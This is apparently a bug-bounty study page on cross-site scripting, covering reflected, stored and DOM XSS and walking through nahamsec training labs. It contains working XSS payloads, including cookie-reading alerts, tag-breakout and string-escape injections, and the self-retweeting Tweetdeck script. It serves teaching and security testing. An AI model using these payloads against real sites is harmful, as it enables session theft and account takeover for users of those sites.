---
title: Cross-Site Scripting (XSS)
description: Cross-Site Scripting Also Known as XSS
date: 2026-01-01
categories: [01_Knowledge-Base, 02_Vulnerabilities]
tags: [Bug Bounty, z3nbu9 , Vulnerabilities, xss]

---

# Cross-Site Scripting (XSS)

## Introduction

### What is XSS?

XSS allows an attacker to execute arbitary client-side code on a victim's browser. XSS can be used for phishing, exfiltrating data, account takeovers and more.

### How does XSS work?

- An attacker inserts a malicious script (or a payload) into the victim's browser
- When the victim encounters the script it executes in the victim's browser
- A malicious payload is able to perform any action that the victim is able to perform.
- If the victim has special privileges it can be a serious vulnerability.

### Impact

- Read / Modify / Delete content of any page
- Steal a users cookies or session and gain access to their account
- Serve malicious content like phishing
- Change email, passwords
- Steal CSRF Token


### Types of XSS

#### Reflected XSS

Payload is injection from the victim's request. Victim must click a malicious link or navigate to an attacker-controlled property.

#### Stored XSS 

Payload is stored server-side and can be triggered by a victim with no interaction outside of the application

#### DOM XSS

The Vulnerability is in the client-side code versus the server-sider. Injection is still typically from the victim's request.


## Reflected XSS


|Request	|  Response	|   Explanation     |
|:-----------------------------------------------:|
|`site.com/page?name=John`	|Hello, John	|Normal request |
|`site.com/page?name=<u>John</u>` |	Hello, `<u>John</u>`  |	No XSS  |
|`site.com/page?name=<u>John</u>`	|   Hello, <u>John</u>	|   Possible XSS|


In this example, the payload is injected into the victim's request using the "name" parameter. In order for this to work, the victim must click this malicious link or navigate to an attacker-controlled property. `https://example.com/page?param=<payload>`


## Stored XSS

Also know as **persistent XSS**

- It stores the payload in the database
- The payload is reflected back to the user when visiting a particular page
- One of the most famous stored XSS is in Tweetdeck by `@derGeruhn`

```javascript
<script class="xss">
$('.xss').parents().eq(1).find('a').eq(1).click();
$('[data-action=retweet]').click();
alert('XSS in Tweetdeck');
</script>

```

The payloadd is stored server-side and can be triggered by a victim without any interaction outside of using the application.

Other Example in
- Payload inserted at dropbox.com as the filename
- later on imported and shared via Facebook


## DOM XSS

DOM XSS happens when javascript reflects data from an attacer controlled resource (for example the within the URL) and passes it to a function later on.

Consider the following piece of code that could be exploited by linking the victim to the following URL:

`https://example.com/#send-transaction0n<div/class="header__wrap"><a/href=javascript:alert(0)><h1>pwn3d</h1></a><img/src=//unskid.me/dist/jesus.gif></div>`

form Hackerone report:

<https://hackerone.com/reports/324303>







## Lab Examples


--- 

### **nahamsec.training**
--- 
#### xss.naham.sec


Checking the input field that is reflecting HTML code or not by

input: `<u>test</u>`

It works now look into the XSS

input: `<script>alert(document.cookie)</script>test`

input: `<script>alert(1)</script>test`

--- 
#### xss2.naham.sec

input: `test`

Here the output come into into `input` tag. Check the code

```HTML
<input value="test" >
```

input: `<script>alert(1)</script> test`

It not effect the code.

outpt: `<input value="<script>alert(1)</script> test" >`

Now, we want to close the `input` tag and write script or required HTML code

input: `test"> <script>alert(1)</script>`

BOOM 💥 it worked.

--- 

#### xss3.naham.sec

input: `test`

Here the output goes into `title` tag of the page. Let check it filtering input or not.

input: `<u> test </u>`

output: `<title> Welcome, <u> test </u> </title>`

So, now we need to close the `title` tag.

input: `</title> <u> test </u> <script> alert(1) </script>`

Boom 💥 it worked.

--- 

#### xss4.naham.sec

input: `<u> test </u>`

url: `http://xss4.naham.sec:3001/?name=%3Cu%3E+test+%3C%2Fu%3E`

```html

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Enter your name!</title>
    <link href="/css/bootstrap.min.css" rel="stylesheet">
</head>
<body>
<div class="container" style="margin-top:20px;">
    <div class="row">
        <div class="col-md-6 col-md-offset-3">
                            <div class="alert alert-success">
                    <p class="text-center">Thanks for entering your name <span id="name"> <u> test </u> </span></p>
                </div>
                    </div>
    </div>
</div>
<script src="/js/jquery.min.js"></script>
<script src="/js/bootstrap.min.js"></script>
<script>
var name = '&lt;u&gt; test &lt;/u&gt;';
$('span#name').html( name );
</script>
</body>
</html>
```


The input is not rendering by HTML why?

If we try to edit in span `<span id="name">&lt;u&gt; test &lt;/u&gt;</span>` so, the input is **purely sanitized we can colse HTML tags**

In another place input is goes into.

```html
<script>
var name = '&lt;u&gt; test &lt;/u&gt;';
$('span#name').html( name );
</script>
```

Here we can't close `script` tag input is sanitized `<>`.

Here Form is using **GET** Method we can see input in URL and we can edit.

Where the vulnerability exists, lets Try to close the var string.

url : `http://xss4.naham.sec:3001/?name=test';+alert(1);+//`

Here,

- `';` : Used to close the `var name = 'test';`
- `+` : Used as `space`
- `alert(1);` : payload
- `//` : Comment(in Javascript) remaing code 

--- 